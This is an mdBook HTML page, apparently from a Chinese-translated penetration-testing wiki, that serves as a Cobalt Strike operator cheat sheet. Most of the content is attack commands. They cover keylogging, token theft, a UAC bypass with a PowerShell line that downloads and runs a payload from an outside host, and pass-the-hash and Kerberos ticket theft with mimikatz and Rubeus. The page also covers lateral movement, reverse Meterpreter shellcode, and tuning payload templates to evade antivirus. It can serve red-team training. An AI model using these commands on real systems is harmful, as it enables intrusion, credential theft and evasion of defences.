@@ -1,0 +1,405 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Cobalt Strike</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="cobalt-strike"><a class="header" href="#cobalt-strike">Cobalt Strike</a></h1>
+<h3 id="listeners"><a class="header" href="#listeners">Listeners</a></h3>
+<h3 id="c2-listeners"><a class="header" href="#c2-listeners">C2 Listeners</a></h3>
+<p><code>Cobalt Strike -&gt; Listeners -&gt; Add/Edit</code> 然后您可以选择监听的位置，使用哪种信标（http、dns、smb...）等。</p>
+<h3 id="peer2peer-listeners"><a class="header" href="#peer2peer-listeners">Peer2Peer Listeners</a></h3>
+<p>这些监听器的信标不需要直接与C2通信，它们可以通过其他信标与其通信。</p>
+<p><code>Cobalt Strike -&gt; Listeners -&gt; Add/Edit</code> 然后您需要选择TCP或SMB信标</p>
+<ul>
+<li><strong>TCP信标将在所选端口设置监听器</strong>。要连接到TCP信标，请使用命令 <code>connect &lt;ip&gt; &lt;port&gt;</code> 从另一个信标</li>
+<li><strong>smb信标将在选定名称的管道中监听</strong>。要连接到SMB信标，您需要使用命令 <code>link [target] [pipe]</code>。</li>
+</ul>
+<h3 id="generate--host-payloads"><a class="header" href="#generate--host-payloads">Generate &amp; Host payloads</a></h3>
+<h4 id="generate-payloads-in-files"><a class="header" href="#generate-payloads-in-files">Generate payloads in files</a></h4>
+<p><code>Attacks -&gt; Packages -&gt;</code> </p>
+<ul>
+<li><strong><code>HTMLApplication</code></strong> 用于HTA文件</li>
+<li><strong><code>MS Office Macro</code></strong> 用于带有宏的办公文档</li>
+<li><strong><code>Windows Executable</code></strong> 用于.exe、.dll或服务.exe</li>
+<li><strong><code>Windows Executable (S)</code></strong> 用于<strong>无阶段</strong>的.exe、.dll或服务.exe（无阶段比有阶段更好，IoCs更少）</li>
+</ul>
+<h4 id="generate--host-payloads-1"><a class="header" href="#generate--host-payloads-1">Generate &amp; Host payloads</a></h4>
+<p><code>Attacks -&gt; Web Drive-by -&gt; Scripted Web Delivery (S)</code> 这将生成一个脚本/可执行文件，以下载来自cobalt strike的信标，格式包括：bitsadmin、exe、powershell和python</p>
+<h4 id="host-payloads"><a class="header" href="#host-payloads">Host Payloads</a></h4>
+<p>如果您已经有要在Web服务器上托管的文件，只需转到 <code>Attacks -&gt; Web Drive-by -&gt; Host File</code> 并选择要托管的文件和Web服务器配置。</p>
+<h3 id="beacon-options"><a class="header" href="#beacon-options">Beacon Options</a></h3>
+<pre class="language-bash"><code class="lang-bash"># 执行本地 .NET 二进制文件
+execute-assembly &#x3C;/path/to/executable.exe>
+
+# 截图
+printscreen    # 通过 PrintScr 方法拍摄单个截图
+screenshot     # 拍摄单个截图
+screenwatch    # 定期拍摄桌面截图
+## 转到 View -> Screenshots 查看它们
+
+# 键盘记录器
+keylogger [pid] [x86|x64]
+## View > Keystrokes 查看按下的键
+
+# 端口扫描
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 在另一个进程中注入端口扫描操作
+portscan [targets] [ports] [arp|icmp|none] [max connections]
+
+# Powershell
+# 导入 Powershell 模块
+powershell-import C:\path\to\PowerView.ps1
+powershell &#x3C;just write powershell cmd here>
+
+# 用户冒充
+## 使用凭据生成令牌
+make_token [DOMAIN\user] [password] # 创建令牌以在网络中冒充用户
+ls \\computer_name\c$ # 尝试使用生成的令牌访问计算机中的C$
+rev2self # 停止使用make_token生成的令牌
+## 使用make_token会生成事件4624：账户成功登录。此事件在Windows域中非常常见，但可以通过过滤登录类型来缩小范围。如上所述，它使用LOGON32_LOGON_NEW_CREDENTIALS，即类型9。
+
+# UAC 绕过
+elevate svc-exe &#x3C;listener>
+elevate uac-token-duplication &#x3C;listener>
+runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
+
+## 从pid窃取令牌
+## 类似于make_token，但从进程中窃取令牌
+steal_token [pid] # 此外，这对于网络操作有用，而不是本地操作
+## 从API文档中我们知道，这种登录类型“允许调用者克隆其当前令牌”。这就是为什么信标输出显示冒充了&#x3C;current_username> - 它正在冒充我们自己的克隆令牌。
+ls \\computer_name\c$ # 尝试使用生成的令牌访问计算机中的C$
+rev2self # 停止使用steal_token的令牌
+
+## 使用新凭据启动进程
+spawnas [domain\username] [password] [listener] # 从具有读取权限的目录执行，例如：cd C:\
+## 类似于make_token，这将生成Windows事件4624：账户成功登录，但登录类型为2（LOGON32_LOGON_INTERACTIVE）。它将详细说明调用用户（TargetUserName）和冒充用户（TargetOutboundUserName）。
+
+## 注入到进程中
+inject [pid] [x64|x86] [listener]
+## 从OpSec的角度来看：除非真的有必要，否则不要执行跨平台注入（例如x86 -> x64或x64 -> x86）。
+
+## 传递哈希
+## 此修改过程需要对LSASS内存进行修补，这是一个高风险操作，需要本地管理员权限，并且如果启用了受保护进程轻量级（PPL），则不太可行。
+pth [pid] [arch] [DOMAIN\user] [NTLM hash]
+pth [DOMAIN\user] [NTLM hash]
+
+## 通过mimikatz传递哈希
+mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
+## 如果没有/run，mimikatz会生成一个cmd.exe，如果您以具有桌面的用户身份运行，他将看到shell（如果您以SYSTEM身份运行，您就可以继续）
+steal_token &#x3C;pid> # 从mimikatz创建的进程中窃取令牌
+
+## 传递票证
+## 请求票证
+execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
+## 创建一个新的登录会话以使用新票证（以免覆盖被攻陷的票证）
+make_token &#x3C;domain>\&#x3C;username> DummyPass
+## 从powershell会话中将票证写入攻击者机器并加载
+[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
+kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
+
+## 从SYSTEM传递票证
+## 使用票证生成新进程
+execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+## 从该进程中窃取令牌
+steal_token &#x3C;pid>
+
+## 提取票证 + 传递票证
+### 列出票证
+execute-assembly C:\path\Rubeus.exe triage
+### 通过luid转储有趣的票证
+execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
+### 创建新的登录会话，注意luid和processid
+execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+### 在生成的登录会话中插入票证
+execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
+### 最后，从该新进程中窃取令牌
+steal_token &#x3C;pid>
+
+# Lateral Movement
+## 如果创建了令牌，将会使用它
+jump [method] [target] [listener]
+## 方法：
+## psexec                    x86   使用服务运行服务EXE工件
+## psexec64                  x64   使用服务运行服务EXE工件
+## psexec_psh                x86   使用服务运行PowerShell单行命令
+## winrm                     x86   通过WinRM运行PowerShell脚本
+## winrm64                   x64   通过WinRM运行PowerShell脚本
+
+remote-exec [method] [target] [command]
+## 方法：
+<strong>## psexec                          通过服务控制管理器远程执行
+</strong>## winrm                           通过WinRM（PowerShell）远程执行
+## wmi                             通过WMI远程执行
+
+## 要使用wmi执行信标（它不在jump命令中），只需上传信标并执行
+beacon> upload C:\Payloads\beacon-smb.exe
+beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
+
+
+# Pass session to Metasploit - Through listener
+## 在metaploit主机上
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
+msf6 exploit(multi/handler) > set LHOST eth0
+msf6 exploit(multi/handler) > set LPORT 8080
+msf6 exploit(multi/handler) > exploit -j
+
+## 在cobalt上：Listeners > Add并将Payload设置为Foreign HTTP。将Host设置为10.10.5.120，将Port设置为8080，然后单击保存。
+beacon> spawn metasploit
+## 您只能使用外部监听器生成x86 Meterpreter会话。
+
+# Pass session to Metasploit - Through shellcode injection
+## 在metasploit主机上
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
+## 运行msfvenom并准备multi/handler监听器
+
+## 将bin文件复制到cobalt strike主机
+ps
+shinject &#x3C;pid> x64 C:\Payloads\msf.bin # 在x64进程中注入metasploit shellcode
+
+# Pass metasploit session to cobalt strike
+## 生成无阶段信标shellcode，转到Attacks > Packages > Windows Executable (S)，选择所需的监听器，选择Raw作为输出类型，并选择使用x64有效负载。
+## 在metasploit中使用post/windows/manage/shellcode_inject注入生成的cobalt strike shellcode
+
+
+# Pivoting
+## 在teamserver中打开socks代理
+beacon> socks 1080
+
+# SSH connection
+beacon> ssh 10.10.17.12:22 username password</code></pre>
+<h2 id="avoiding-avs"><a class="header" href="#avoiding-avs">Avoiding AVs</a></h2>
+<h3 id="artifact-kit"><a class="header" href="#artifact-kit">Artifact Kit</a></h3>
+<p>通常在<code>/opt/cobaltstrike/artifact-kit</code>中，您可以找到cobalt strike将用于生成二进制信标的代码和预编译模板（在<code>/src-common</code>中）。</p>
+<p>使用<a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a>与生成的后门（或仅使用编译的模板），您可以找到触发防御者的原因。通常是一个字符串。因此，您可以修改生成后门的代码，以便该字符串不出现在最终的二进制文件中。</p>
+<p>修改代码后，只需从同一目录运行<code>./build.sh</code>，并将<code>dist-pipe/</code>文件夹复制到Windows客户端的<code>C:\Tools\cobaltstrike\ArtifactKit</code>中。</p>
+<pre><code>pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
+</code></pre>
+<p>不要忘记加载激进脚本 <code>dist-pipe\artifact.cna</code>，以指示 Cobalt Strike 使用我们想要的磁盘资源，而不是加载的资源。</p>
+<h3 id="资源包"><a class="header" href="#资源包">资源包</a></h3>
+<p>ResourceKit 文件夹包含 Cobalt Strike 基于脚本的有效载荷模板，包括 PowerShell、VBA 和 HTA。</p>
+<p>使用 <a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a> 和模板，您可以找到防御者（在这种情况下是 AMSI）不喜欢的内容并进行修改：</p>
+<pre><code>.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
+</code></pre>
+<p>修改检测到的行可以生成一个不会被捕获的模板。</p>
+<p>不要忘记加载激进脚本 <code>ResourceKit\resources.cna</code>，以指示 Cobalt Strike 使用我们想要的磁盘资源，而不是加载的资源。</p>
+<pre><code class="language-bash">cd C:\Tools\neo4j\bin
+neo4j.bat console
+http://localhost:7474/ --&gt; Change password
+execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL
+
+
+
+# Change powershell
+C:\Tools\cobaltstrike\ResourceKit
+template.x64.ps1
+# Change $var_code -&gt; $polop
+# $x --&gt; $ar
+cobalt strike --&gt; script manager --&gt; Load --&gt; Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna
+
+#artifact kit
+cd  C:\Tools\cobaltstrike\ArtifactKit
+pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
+
+
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../windows-hardening/av-bypass.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../mobile-pentesting/android-checklist.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../windows-hardening/av-bypass.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../mobile-pentesting/android-checklist.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <script src="../searcher.js"></script>
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
